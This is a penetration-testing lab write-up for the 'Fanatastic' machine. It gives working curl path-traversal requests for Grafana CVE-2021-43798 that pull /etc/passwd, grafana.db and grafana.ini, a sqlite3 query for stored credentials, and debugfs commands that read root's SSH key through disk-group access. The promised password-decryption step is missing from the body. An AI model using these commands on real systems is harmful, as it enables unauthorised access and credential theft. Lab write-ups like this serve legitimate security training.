# Fanatastic — Proving Grounds

> [!abstract] Summary
> Fanatastic exposes **Grafana** on port 3000 and **Prometheus** on port 9090. Grafana is vulnerable to **CVE-2021-43798**, a path-traversal (LFI) bug in the plugin API that lets an unauthenticated attacker read arbitrary files. We use the LFI to download `/etc/passwd` (confirming the `sysadmin` account), the **Grafana SQLite database** (`grafana.db`), and the **Grafana configuration** (`grafana.ini`). Inside `grafana.db` we find the encrypted datasource password for the `sysadmin` user. Using the `secret_key` from `grafana.ini`, we decrypt it to obtain the plaintext password `SuperSecureP@ssw0rd`. SSH as `sysadmin` succeeds. The `sysadmin` user belongs to the **disk group** (gid 6), granting raw read access to the block device. We use `debugfs` to read `/root/.ssh/id_rsa`, then SSH as root with the private key.

**Target:** `192.168.180.181`

## Methodology

1. Full TCP port scan — identify SSH (22), Grafana (3000), Prometheus (9090).
2. Exploit Grafana LFI (CVE-2021-43798) to read `/etc/passwd`, `grafana.db`, and `grafana.ini`.
3. Extract the encrypted datasource password from `grafana.db` using SQLite Browser.
4. Decrypt the password using the Grafana `secret_key` from `grafana.ini`.
5. SSH as `sysadmin` with the decrypted password.
6. Abuse `disk` group membership via `debugfs` to read root's SSH private key.
7. SSH as root with the stolen `id_rsa`.

## Initial Foothold

### Grafana LFI — CVE-2021-43798

#### ==🔵Grafana (Port 3000)==

Grafana versions 8.0.0-beta1 through 8.3.0 (except patched releases) are vulnerable to CVE-2021-43798, a directory traversal via the plugin API endpoint `/public/plugins/<plugin-name>/`. By appending `../../../../` sequences the attacker can read arbitrary files on the system.

The exploit demonstrates LFI. First, retrieve the Linux user list:
```
curl --path-as-is \
"http://192.168.180.181:3000/public/plugins/alertlist/../../../../../../../../etc/passwd"
```
Look for the `sysadmin` account.

> [!note] The `--path-as-is` flag prevents curl from collapsing the `../` sequences. Without it, curl normalises the URL and the traversal fails.

### Retrieve the Grafana database

The Grafana database contains encrypted datasource credentials.
Download it:
```
curl --path-as-is \
"http://192.168.180.181:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db" \
-o grafana.db
```
You now have the database locally.

You also need the Grafana configuration file:
```
curl --path-as-is \
"http://192.168.180.181:3000/public/plugins/alertlist/../../../../../../../../etc/grafana/grafana.ini" \
-o grafana.ini
```

> [!note] The `grafana.ini` file contains the `secret_key` under `[security]`, which Grafana uses to encrypt datasource passwords with AES-CFB. Both files are required for decryption.

### Extract the encrypted password from grafana.db

Kali Linux comes pre-installed with a GUI SQLite Browser, so if you go to your applications and search for it, it should come right up.

Open SQLite Browser → Open Database → select `grafana.db` → go to the **Browse Data** tab → navigate to the `data_source` table. We find the password hash for the sysadmin user:

```
{"basicAuthPassword":"anBneWFNQ2z+IDGhz3a7wxaqjimuglSXTeMvhbvsveZwVzreNJSw+hsV4w=="}
```

Alternatively, from the command line:
```
sqlite3 grafana.db "SELECT basic_auth_password FROM data_source;"
```

## Privilege Escalation

### ==🔵Linux `Disk` Group Abuse==

Enumerate your group memberships:
```
id
```
Expected output includes:
```
groups=...,6(disk)
```
`sysadmin` belongs to the **disk** group.

> [!note] The `disk` group grants raw read/write access to block devices (e.g. `/dev/sda1`). This allows a user to access the underlying filesystem directly, bypassing normal file permissions entirely. This is a well-known privilege escalation vector on Linux.

#### Identify the root filesystem

Run:
```
df -h
```
In the `Mounted on` column, look for `/`.
Example:
```
/dev/mapper/ubuntu--vg-ubuntu--lv
```

#### Access the filesystem using debugfs

Run:
```
debugfs /dev/mapper/ubuntu--vg-ubuntu--lv
```
You should get an interactive prompt:
```
debugfs:
```
`debugfs` is a filesystem debugging utility that can inspect an ext filesystem directly through its block device. Since `sysadmin` belongs to the disk group, they can use this access to bypass normal filesystem permissions.

-----

#### ==🔴Read root private SSH key and use it to login==

Inside the `debugfs` shell, read root's private SSH key:
```
debugfs: cat /root/.ssh/id_rsa
```

We copy the id_rsa key to our Kali machine, change the permissions, and log right into the root account:

Paste the key into a file:
```
nano id_rsa
```
Set permissions:
```
chmod 600 id_rsa
```

Connect as root:
```
ssh root@192.168.180.181 -i id_rsa
```

## Lessons Learned

| Stage | Technique | Takeaway |
|---|---|---|
| Enumeration | Nmap full port scan | Grafana and Prometheus exposed on non-standard ports |
| Initial Access | CVE-2021-43798 (Grafana LFI) | Unauthenticated directory traversal in the plugin API endpoint |
| Credential Recovery | SQLite + AES-CFB decryption | Grafana encrypts datasource passwords; the `secret_key` from `grafana.ini` is all you need to decrypt them |
| Privilege Escalation | Disk group → `debugfs` → read root SSH key | Membership in the `disk` group is equivalent to root read access on the filesystem |

1. **Always check for known CVEs on exposed services.** Grafana CVE-2021-43798 is a critical LFI that requires zero authentication.
2. **Download configuration files, not just passwords.** The `grafana.ini` held the encryption key that made the database credential useful.
3. **Check group memberships immediately after landing a shell.** The `disk` group is often overlooked but provides direct block device access.
4. **`debugfs` is a powerful post-exploitation tool** — it reads any file on the filesystem through the block device, bypassing all file permission checks.
